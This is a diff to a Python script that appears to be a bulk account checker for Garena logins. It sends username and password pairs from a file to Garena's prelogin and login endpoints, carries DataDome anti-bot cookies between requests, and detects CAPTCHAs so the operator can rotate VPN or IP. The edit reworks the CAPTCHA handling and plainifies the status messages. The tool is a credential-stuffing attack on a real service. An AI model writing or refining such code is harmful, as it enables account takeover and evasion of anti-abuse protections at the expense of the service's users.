@@ -496,10 +496,10 @@ def check_account(username, password, date):
         login_url = "https://auth.garena.com/api/prelogin"
         response = requests.get(login_url, params=params, cookies=cookies, headers=headers)
 
+        # ✅ CAPTCHA detection
         if "captcha" in response.text.lower():
-            print(f"{RED}[🔴 𝐒𝐓𝐎𝐏] CAPTCHA detected. Please change your VPN or IP and enter again.{RESET}")
-            input("🆘 ᴘʟᴇᴀsᴇ ᴄʜᴀɴɢᴇ ʏᴏᴜʀ ᴠᴘɴ ᴏʀ ɪᴘ ᴀɴᴅ ᴘʀᴇss ᴇɴᴛᴇʀ ᴛᴏ ᴄᴏɴᴛɪɴᴜᴇ...")
-            return "[🔴 𝐒𝐓𝐎𝐏] ᴄᴀᴘᴛᴄʜᴀ ᴅᴇᴛᴇᴄᴛᴇᴅ. ᴘʟᴇᴀsᴇ ᴛʀʏ ᴀɢᴀɪɴ ʟᴀᴛᴇʀ."
+            print(f"[🔴 STOP] CAPTCHA detected.")
+            raise RuntimeError("CAPTCHA_DETECTED")
 
         if response.status_code == 200:
             data = response.json()
@@ -508,7 +508,7 @@ def check_account(username, password, date):
             prelogin_id = data.get('id')
 
             if not all([v1, v2, prelogin_id]):
-                return "[😢] 𝗔𝗖𝗖𝗢𝗨𝗡𝗧 𝗗𝗜𝗗𝗡'𝗧 𝗘𝗫𝗜𝗦𝗧"
+                return "[😢] ACCOUNT DIDN'T EXIST"
 
             new_datadome = response.cookies.get('datadome', cookies.get('datadome'))
             encrypted_password = getpass(password, v1, v2)
@@ -519,7 +519,7 @@ def check_account(username, password, date):
             if "error" in data or data.get("error_code"):
                 return f"[FAILED] Status: {data.get('error', 'Unknown error')}"
 
-            # Assuming check_login returns a string with status messages
+            # Call login function
             tre = check_login(username, random_id, encrypted_password, password, headers, cookies, new_datadome, date)
             if "✅ LOGIN SUCCESSFUL" in tre or "[✅]" in tre:
                 return "SUCCESS", tre
@@ -530,6 +530,7 @@ def check_account(username, password, date):
 
     except Exception as e:
         return f"[FAILED] {e}"
+
 def bulk_check(file_path):
     successful_count = 0
     failed_count = 0
